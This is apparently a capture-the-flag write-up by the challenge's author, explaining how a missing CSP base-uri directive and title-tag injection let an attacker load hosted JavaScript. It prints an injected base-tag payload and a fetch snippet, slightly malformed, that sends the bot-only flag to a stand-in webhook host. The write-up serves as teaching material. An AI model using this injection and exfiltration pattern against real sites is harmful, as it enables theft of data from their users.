# XSS Challenege writeup

So it was a simple XSS challenge where you could create notes and report it to the bot and the bot would visit it and the flag was in the /flag endpoint which only the bot was allowed to visit and when you will look into the source code or explore the website and see the CSP directives that are used in the website you would see that one very important CSP directive base-uri which controls which base URLs are allowed for a document is not used in the note viewing page which is a huge RED flag and also when you will see further you will se that there is script being loaded which when you will see in source code is doing nothing.


![image](https://github.com/user-attachments/assets/0a758fdb-00c7-4e7e-8451-5ea9a8d3e6f2)

So now you can think what you are supposed to do, You are supposed to change the base-url something where you are supposed to upload a js file in /static/min.js where you could put a js something like this 
```js
fetch('http://127.0.0.1:5000/flag')
  .then(response => response.text())
  .then(flag => {

    fetch(`https://your-webhook-site?flag=${encodeURIComponent(flag)}`));
```

But now one more step is left which is where would you put this base tag, there's one condition that the base tag should be put inside the head tag so when you will write a note and view it you would see that the title of the note that you write appears in the head although on the note you see you don't see the title you just see the note id 


![image](https://github.com/user-attachments/assets/498bc648-1da9-4b82-b690-751ec1217b51)


So you in the title of the note you could close the the title tag and put the base tag something like this 

`</title> <base href="your-url-where-you-have-uploaded-the-js/" > `

and boom the js you have uploaded will now be fetched and executed and then you could create a note and then go to the report endpoint and report that note with the url and you would get the flag in your webhook something like this

`https://your-webhook-server?flag=flag{fake_flag}`

I hope you had fun solving this challenge and this was the first challenge that I made so you could find it easy to solve but I guess the level of difficulty would probably increase as I create more challenges.
